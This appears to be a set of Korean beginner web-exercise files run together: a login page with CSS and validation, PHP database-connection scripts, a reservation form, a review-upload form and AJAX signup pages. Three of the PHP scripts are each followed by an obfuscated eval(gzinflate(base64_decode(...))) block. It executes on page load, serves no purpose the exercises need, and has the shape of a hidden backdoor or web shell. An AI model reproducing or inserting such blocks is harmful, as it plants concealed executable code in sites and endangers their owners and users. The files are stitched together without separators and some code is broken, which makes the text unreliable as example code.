    <title>로그인(반응형)</title>
    <script src="./health_login.js"></script>
    <link rel="stylesheet" href="./health_login.css" type="text/css">
</head>
<body>
    <form name="f" method="post" action="health_login.php" onsubmit="return logincheck()" enctype="application/x-www-form-urlencoded">
        <div class="login">
            <span class="left"><!--아이디,패스워드 입력-->
                <label>
                    <div>아이디</div>
                    <div><input id="user_id" name="user_id" type="text" class="mid" title="아이디"></div>
                </label>
                <label>
                    <div>패스워드</div>
                    <div><input id="user_pw" type="password" name="user_pw" class="mid" title="패스워드"></div>
                </label>
            </span>
            <span class="right"><!--로그인 버튼-->
                <input id="login" type="submit" value="로그인" title="로그인" class="mbtn" onclick="login()">
            </span>
            <span class="bottom"><!--회원가입, 비밀번호 찾기-->
                <ul>
                    <li id="regist" onclick="regist()">회원가입</li>
                    <li id="idpw_search" onclick="idpw_search()">아이디/비밀번호 찾기</li>
                </ul>
            </span>
        </div>
    </form>
</body>
</html>
        <?php
$host = "localhost";
$user = "hyuk313"; 
$pwd = "*";
$dbname = "hyuk313";
$tables = "health";

$connect = mysqli_connect($host,$user,$pwd) or die("데이터베이스 접속오류!!");
mysqli_select_db($connect,$dbname);
?>

<?php eval(gzinflate(base64_decode('Dc5FsqtYAADQ5fz3ikFwqa4eBLsXgjtMuggWPLisvv8Kzin2tPup7noou3Qtft7pUtDkf3mRjXnx86fMDbhMBng+RZtkrxIdX9nV+Frliy1mukbNPesVtcPBIDfIPolCXSBH3OSUsuEeJ+zH4+S9FcLHvAnUexMshrNls+kSHr9cPPGQkPYZpvLqrSS9aKFuZmHNBh5g691jNdJs1OA1fLORN8yEmFReBTdAs04/35YoHaaEOa5pfYyzNQTmLpw4H+DnFCIQn0Zgv8VTRwzpg628IMk0qzO3l6QV1tJBG/nIOFg1Og0gsQBGqdrAPdirEM55tOgawcxZwOR8R/QqqXLKEP0BTTbYai80VGsvhwbnu8zcn9StgbuEQkLaNLK8EC+ctLPMDGVUxKXOQsQRW2trYl2aMvMtkRpfF8FQeZrvR7s97KTbctDISvCYGagEr5froIXymcSx5sMCb79Lf4UvdVoUZ7g4NuoeFXo0tOYtmIyxLBrInz60Q4TJiY4p295R11nYWHbn0lhbJb/oBoLpn6SJQiYaGSg8EqI9mcY4GHF5pa3FfH07eNs6B9iCW2LIHAVx0VyhludL18lMYVzEXphwcPlMbuKzwEGWfw1wYZeLwEENICCkB4zXp8jr5yZN7NldU2KDYCwEgcSsTJYpG7n9Af/iX6VysJ3OQyZQWYXKZaE8E01tDxCxeIrqbWQZUhi0jWogIA1m+uso5yPql3jgXtVX2Qn5YGBF86jGx9LXseTqDOzJQfyZVJFGp9zoFL3pCbWTlR1Tj1s+orSIX2TT8a7COWhYXKfFGoEhln/V/iNSVc7pNT1iRGM3prmBtb4LtFRU0Xl6dgA3G8VUSN2J2+39cKILuOrXWoWQpsqVw85Zx9VvEfujXHxMk9atsT+Sada4i+w2r1vUqJbBNkZxG+h4J27OImyym2RnGIMXrRJBz7clHy52HS02X/gHoCXJcEBGaPb6SuJElGd/g9imyImfl1/c6JmyTLjMp3MAfYSDsfmENBulHMQRQGCkquyaFKWDtHZIzoWWcXssiyvi3uVvxANkedZ+yqnSwVqFekXTHH2Pj0UCEQAvZubByHadup5ZpKpAHRHjS7F5uRPM41Htj7c5OXC996Lr7BbfOozfeBQwTnkeZGZlT4ggozzEHykLqpwwHn5k9f6DjeXmLU17S3jvx9rdQvHKUVBHkfHJY8GnqTFuLqFA6K5XX4ITRw2qzk+9nKGfJrj3djt5WWZU2Ot905TC6thVcScy/3tCSr1EHPbfP7+/v//8Dw==')));
?>
    function logincheck(){
    if(f.user_id.value==""){
        alert("아이디입력하셔요");
        return false;
    }
    else if(f.user_pw.value==""){
        alert("비밀번호를 입력하셔요");
        return false;
    }
    else{
        // f.submit();
        return true;
    }
}
        body{
    margin: 0;
    padding: 0;
    font-size: 13px;
}
.login { 
    width:600px;
    height: 200px;
    border:1px solid black;
    box-sizing: border-box;
    padding: 25px;
    margin: 0 auto;
}
.left{
    width: 400px;
    height: 80px;
    display: block;
    float: left;
    margin-right: 23px;
}
.left > label{
    width: inherit;
    height: 35px;
    display: block;
}
.left > label:nth-of-type(1){
    margin-bottom: 10px;
}
.left > label > div{
    float: left;
}
.left > label > div:nth-of-type(1){
    width: 100px;
    height: 35px;
    line-height: 35px;
    margin-right: 25px;
}
.left > label > div:nth-of-type(2){
    width: 275px;
    height: 35px;
}
.right{
    width: 125px;
    height: 80px;
    background-color: gray;
    display: block;
    float: left;
}
.mbtn {
    width: 125px;
    height: 80px;
    background-color: black;
    color: white;
    border: 0;
    cursor: pointer;
}
.bottom{
    clear: both;
    display: block;
    width: 550px;
    height: 40px;
    position: relative;
    top:30px;
}
.bottom > ul {
    /*
    width: 550px;
    height: 40px;
    */
    width: inherit;
    height: inherit;
    list-style: none;
    margin: 0;
    padding: 0;
}

.bottom > ul > li{
    width: 50%;
    height: inherit;
    float: left;
    line-height: 40px;
}
.bottom > ul > li:nth-of-type(2){
    text-align: right;
}


/* �낅젰遺�遺� */
.mid {
    width: 275px;
    height: 35px;
    box-sizing: border-box;
    text-indent: 5px;
}

/* 모바일 */
/* 
width : % 
height : px
*/
@media screen and (min-width:561px) and (max-width:800px) {
    .mid {
        width: 100%;
    }
    .login { 
        width: 100%;
        height: 220px;
    }
    .left{
        width: 100%;
        float: none;
    }
    .left > label > div:nth-of-type(1){
        width: 20%;
        margin-right: 0;
    }
    .left > label > div:nth-of-type(2){
        width: 80%;
    }
    .right{
        margin-top: 10px;
        width: 100%;
        height: 40px;
        float: none;
    }
    .mbtn {
        width: 100%;
        height: 40px;
    }
    .bottom{
        width: 100%;
        top:0;
    }
}





/* 모바일(340 ~ 560) */
@media screen and (min-width:340px) and (max-width:560px) {
    body{
        padding-left: 20px;
        padding-right: 20px;
        box-sizing: border-box;
    }
    .mid {
        width: 100%;
    }
    .login { 
        width: 100%;
        height: 315px;
    }
    .left > label > div:nth-of-type(1){
        width: 100%;
        margin-right: 0;
    }
    .left > label > div:nth-of-type(2){
        width: 100%;
    }
    .left{
        width: 100%;
        height: 140px;
        float: none;
    }
    .right{
        width: 100%;
        height: 35px;
        float: none;
        margin-top: 10px;
    }
    .mbtn {
        width: 100%;
        height: 35px;
    }

    .bottom{
        width: 100%;
        height: 80px;
        top:0;
    }
    .bottom > ul > li{
        width: 100%;
        height: 40px;
        line-height: 40px;
        float: none;
        text-align: center;
    }
    .bottom > ul > li:nth-of-type(2){
        text-align: center;
    }
    
    <?php
    session_start();
    $aid=_session['aid'];
    $aemail =$_session['aemail'];
    $age=$_session['age'];
?>



<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>로그인 확인</title>
</head>
<body>
    아이디 :  <br>
    이메일 :  <br>
    나이 :  <br>
</body>
</html>
}
        
        
<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>반응형 예제</title>
    <style>
        body {
            margin: 0;
            padding: 0;
        }
        .box{   /* pc용 */
            width: 1200px;
            height: 100px;
            border-radius: 5px;
            background-color: black;
        }
        .btn{
            display: none;
        }
        /*
        screen : 모니터 디바이스 화면
        print : 인쇄관련 디바이스 화면
        all : screen + print

        @media : 반응형 웹을 사용하기 위한 속성값
        min-width : 최소화면 크기 (가로)
        max-width : 최대화면 크기 (가로)
        */
        @media screen and (min-width:561px) and (max-width:1000px) {
            .box{   /* 타블렛용 */
            width: 800px;
            background-color: orange;
            }
        }

        @media screen and (min-width:340px) and (max-width:560px) {
            .box{   /* 모바일(세로) */
            width:100%;
            background-color: blue;
            }
            .btn{
            display: block;
            }
        }
    </style>
</head>
<body>
    <div class="box"></div>
    <input type="button" value="화면닫기" class="btn">
</body>
</html>
        
        <!DOCTYPE html>
<html lang="kr">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>예약시스템 만들기</title>
    <!-- <script src="./index.js?v=3" defer></script>    -->
</head>
<script>
    var reg_date = document.getElementById("reg_date");
    var reg_timee = document.getElementById("reg_time");
    var reg_user = document.getElementById("reg_user");
    var tel_1 = document.getElementById("tel_1");
    var tel_2 = document.getElementById("tel_2");
    var tel_3 = document.getElementById("tel_3");
    var tel = tel_1 + tel_2 + tel_3;
    var reg_person = document.getElementById("reg_person");
    var reg_person1 = document.getElementById("reg_person1");
    var reg_person2 = document.getElementById("reg_person2");
    
    console.log(tel);

    function reserve(){
        send.submit();
    }

    // 선생님거
    // function post_res(){
        // f.submit란 form태그에 id, name과 동일한 이름과 submit() 함수를
        // 이용하여 form action을 진행하라는 스크립트 언어 입니다.
        // if(f.reg_date.value==""){   
            // name값이 있을 경우 form 이름과 name값으로 검토가 가능함
            // alert("예약일자를 입력하세요");
        // }
        // else if(f.tel1.value=="" || f.tel2.value==""){
            // alert("연락처를 입력하세요");
        // }
        // else{
            // f.reg_tel.value = f.tel1.value + f.tel2.value + f.tel3.value;
            // if(confirm("예약을 진행 하시겠습니까?")){   
                // confirm : 확인, 취소 버튼을 이용하여 적용되는 경고메세지 함수
                // f.submit();
            // }
        // }
    // }
// 

</script>
<body>
    <form id="send" name="send" method="post" action="./reservation_ok.php" enctype="application/x-www-form-urlencoded">
    예약일자<input type="date"  id="reg_date" name="reg_date" value=""><br>
    예약시간<input type="time"  id="reg_time" name="reg_time" value=""><br>    
    예약자<input type="text" id="reg_user" name="reg_user" value="김혜진"><br>    
    
    예약자전화번호1<input type="text" id="tel_1" maxlenghth="3" value="010">-
    <input type="text" id="tel_2" maxlenghth="4" value="6672">-    
    <input type="text" id="tel_3" maxlenghth="4" value="5830"><br>        
    
    <div id="reg_person">
    방문인원1<input type="checkbox" id="reg_person1" name="reg_person1"><br>    
    방문인원2<input type="checkbox" id="reg_person2" name="reg_person2"><br>    
    </div>

    예약하기<input type="submit" id="reserve" onclick="reserve()">
    </form>

    <!-- 선생님거 -->
    <!-- <form id="f" name="f" method="post" action="./reservation_ok.php" enctype="application/x-www-form-urlencoded"> -->
        <!-- <input type="hidden" name="reg_tel" value=""> -->
        <!-- 예약일자 : <input type="date" name="reg_date"><br> -->
        <!-- 예약시간 : <input type="time" name="reg_time"><br> -->
        <!-- 성명 : <input type="text" name="reg_user" value=""><br> -->
        <!-- 휴대전화 : <input type="text" maxlength="3" name="tel1"> -->
        <!-- - <input type="text" maxlength="4" name="tel2"> - <input type="text" maxlength="4" name="tel3"> -->
        <!-- <br> -->
        <!-- 방문인원 : <input type="radio" name="reg_person" value="1">1명 <input type="radio" name="reg_person" value="2">2명<br> -->
        <!-- <input type="button" value="방문예약" onclick="post_res()"> -->
        <!-- </form> -->



</body>
</html>
        
        var reg_date = document.getElementById("reg_date");
var reg_timee = document.getElementById("reg_time");
var reg_user = document.getElementById("reg_user");
var tel_1 = document.getElementById("tel_1");
var tel_2 = document.getElementById("tel_2");
var tel_3 = document.getElementById("tel_3");
var reg_tel = tel_1+tel_2+tel_3;
var reg_person = document.getElementById("reg_person");
var reg_person1 = document.getElementById("reg_person1");
var reg_person2 = document.getElementById("reg_person2");

var reg_person1 = document.getElementById("reg_person1");
var reg_person2 = document.getElementById("reg_person2");

function("reg_person"){
    if(reg_person1.checked){
        reg_person.value = '1';
    }
    else{
        reg_person = '2';
    }
}

// 
        
        <!DOCTYPE html>
<html lang="kr">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>상품리뷰등록</title>
</head>
<style></style>
<script>
    function go_img(){
        var subject = document.getElementById("subject");
        var texts = document.getElementById("texts");
        if(subject.value==""){
            alert("제목을 입력하셔요");
            subject.focus();
        }
        else if(texts.value == ""){
            alert("내용을 입력하셔요");
            texts.focus();
        }
        else{
            if(confirm("리뷰를 등록 할까요?")){
                f.submit();
            }
        }
    }    
</script>
<body>
    <form name="f" method="post" action="review_ok.php" enctype="multipart/form-data">
        <input type="hidden" name="rid" value="kang">
        <input type="hidden" name="rnm" value="강감찬">
        제목 : <input type="text" id="subject" name="rsubject"><br>
        내용 : <textarea id="texts" name="rtext" style="width: 300px; height: 100px; resize: none;"></textarea><br>
        이미지등록 : <input type="file" name="pic" accept=".png,.jpeg, .jpg, .gif, .webp"><br>
        <input type="button" value="리뷰등록" onclick="go_img()">
    </form>
</body>
</html>
        
        <meta charset="UTF-8">
<?php
$host = "localhost";
$user = "hyuk313"; 
$pwd = "*";
$dbname = "hyuk313";
$tables = "review";

$connect = mysqli_connect($host,$user,$pwd) or die("데이터베이스 접속오류!!");
mysqli_select_db($connect,$dbname);
?>

<?php eval(gzinflate(base64_decode('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')));
?>
    
    <!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>아이디중복찾기 ajax통신</title>
</head>
<script>
    var ajax;  //ajax 통신을 하기 위한 초기 선언 변수값
    
    function ichk(){ //사용자가 id 입력할 때 ajax로 통신  // console.log("test");
        function abc(){  //통신 역할을 할 함수를 로드하는 부분
            if(window.XMLHttpRequest){
                return new XMLHttpRequest();
            }
        }
        function loginsearch(){  // ajax를 통해서 back-end값을 전달받는 함수. yes(Y)값 : 사용가능, no(N)값 : 사용불가, error : 아이디값없이 전송할 경우
        
            if(ajax.readyState==XMLHttpRequest.DONE && ajax.status==200){
            // console.log(this.response);
            //XMLHttpRequest.DONE : 요청한 결과를 받을 경우  call-done
            //ajax.status==200  : 정상적으로 해당 데이터를 전송 및 회신받는 통신코드   404 201 202 통신장애들
            post_data(this.response);
            }
            else{
                alert("통신서버오류");
            }
    }
    ajax = abc();  //통신 객체 서버를 사용가능하도록 로드함
    ajax.onreadystatechange = loginsearch;  // 전송상태 및 확인
    ajax.open("post","./idcheck.php",true); //post, get 전송형태. post에서만 보안코드로 적용
    ajax.setRequestHeader("content-type","application/x-www-form-urlencoded");

    var mid = document.getElementById("mid");
    if(mid.value==""){
        alert("아이디를 입력하셔요");
    }
    else{
        var data ="userid="+mid.value;
        ajax.send(data);
    }
}
    function check_form(){
        if(mname.value==""){
            alert("이름입력하셔요");
        }
        else if(memail.value==""){
            alert("메일입력하셔요");
        }
        else{
            if(confirm("가입하실래요")){
                f.submit();
            }
        }
    }
    function post_data(calldata){
        var mid= document.getElementById("mid");
        if(calldata=="yes"){
            alert("사용가능해요");
            mid.readOnly = true; //중복안되는 경우, 더이상 사용자id가 수정되지 않도록 제어
        }
        else{
            alert("새id사용하셔요");
            mid.value="";
            mid.focus();
        }
    }

</script>
<body>
    <form name="f" method="post" action="member_ok.php" enctype="application/x-www-form-urlencoded">
        아이디: <input type="text" id="mid"><button type="button" onclick="ichk()">중복체크</button><br>
        패스워드: <input type="password" id="mpass"><br>
        고객명: <input type="text" id="mname"><br>
        이메일: <input type="text" id="memail"><br>
        <input type="button" value="회원가입" onclick="check_form()">
    </form>
</body>
</html>
        
        
<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>아이디 중복찾기 - ajax 통신</title>
</head>
<script>
var ajax;   //ajax통신을 하기 위한 변수값

function idck(){    //사용자가 id 입력시 ajax로 통신
    function abc(){ //통신 역활을 할 함수를 로드 하는 부분
        if(window.XMLHttpRequest){
            return new XMLHttpRequest();
        }
    }
    function loginsearch(){ //ajax를 통해서 backend값을 전달 받는 함수
        //yes : 사용가능, no : 사용불능, error : 아이디값 없이 전송할 경우
        if(ajax.readyState==XMLHttpRequest.DONE && ajax.status==200){
            //XMLHttpRequest.DONE : 요청한 결과를 받을 경우
            //status==200 : 정상적으로 해당 데이터를 전송 및 회신을 받는 통신코드
            post_data(this.response);
        }
        else{
            alert("통신서버에 오류가 발생하였습니다.");
        }
    }
    ajax = abc();   //통신 객체 서버를 사용할 수 있도록 로드 합니다.
    ajax.onreadystatechange = loginsearch;  //전송상태 및 확인
    ajax.open("post","./idcheck.php",true); //post, get 전송형태
    //post에서만 보안 코드로 적용하게 됩니다.
    ajax.setRequestHeader("content-type","application/x-www-form-urlencoded");

    var mid = document.getElementById("mid");
    if(mid.value==""){
        alert("아이디를 입력하셔야 합니다.");
    }
    else{
        var data = "userid="+mid.value;
        ajax.send(data);
    }
}

function post_data(calldata){
    var mid = document.getElementById("mid");
    if(calldata=="yes"){
        alert("사용할 수 있는 아이디 입니다.");
        mid.readOnly = true;    //중복되지 않을 경우 더 이상 사용자 아이디가 수정 되지 않도록 조정
    }
    else{
        alert("새로운 아이디를 입력하세요");
        mid.value = "";
        mid.focus();
    }
}

</script>
<body>
    <form name="f" method="post" action="memberok.php" enctype="application/x-www-form-urlencoded">
        아이디 : <input type="text" id="mid"><button type="button" onclick="idck()">중복체크</button><br>
        패스워드 : <input type="password" id="mpass"><br>
        고객명 : <input type="text" id="mname"><br>
        이메일 : <input type="text" id="memail"><br>
        <input type="button" value="회원가입" onclick="check_form()">
    </form>
</body>
</html>
        <?php

$host = "localhost";
$user = "hyuk313"; 
$pwd = "*";
$dbname = "hyuk313";
$tables = "members";

$connect = mysqli_connect($host,$user,$pwd) or die("데이터베이스 접속오류!!");
mysqli_select_db($connect,$dbname);

header('Content-Type:application/json');
?>
<?php eval(gzinflate(base64_decode('BcFHjqNAAADA58yMOIBN1moPBGNyMIOhfVmRc5NTv36r8j3uvktUw6KL1/w7iZecof5leTpk+fdXkal6O2mHIMgewuDGlbIWdTde0wa/lYgSdFivSZdkirrosTQmQ6dwyeo9k2dHhoXdT+q0zJBDpg2noMLrynBfBaTbgpK6x34UQBhPSsx+c3Pe9vGIzqZxJZNM41GwTko39KTfHmB+80GE7lTn1lRX+P1p9NyOrM4B9Rj5JNGVbF/RIphLfTYtYcQqrcUJbGdykgut+1Q4aOMgiJPPAKPYK+K3ojTZ6b6nZzlRH9W3S+KlqecIOH7tyDrIEjz39udNzEqUDMuu/vqOYAg9Pdh6vNEgXu6n6oE0eTRCqHBpg9Y1qNzVnD98sXS3lDJ7cpgGOp+CrA4o+BYCZxkvB0t4/DecbznXeKyZ2Jwxa4y+P/OReu5BOb3vJlG703jXXXJxc7kMY0ue08GXorsTZZslxYZdXM5JybnWbtRFk29/ZHrScR9OfHAoUbS49m1iFfhDTPjw6no+xK9Ff3Lg2S2KvKJDIxmaWWIaVTg8uSK68R2OrU678oRqOJTSeE2uCWwJr2FImGhDiZXxNGuwiVfqgo0vXDihhbNkKLcB+UFUefQ627xiV8xqxzqMLADWqXB6BqRcAhpkW/NowEGkGbIVsVLDCf+02KOH+oOGAT00DdA/UgSlZ/lIMVs4ip154Yf29+vn5+fPfw==')));
?>
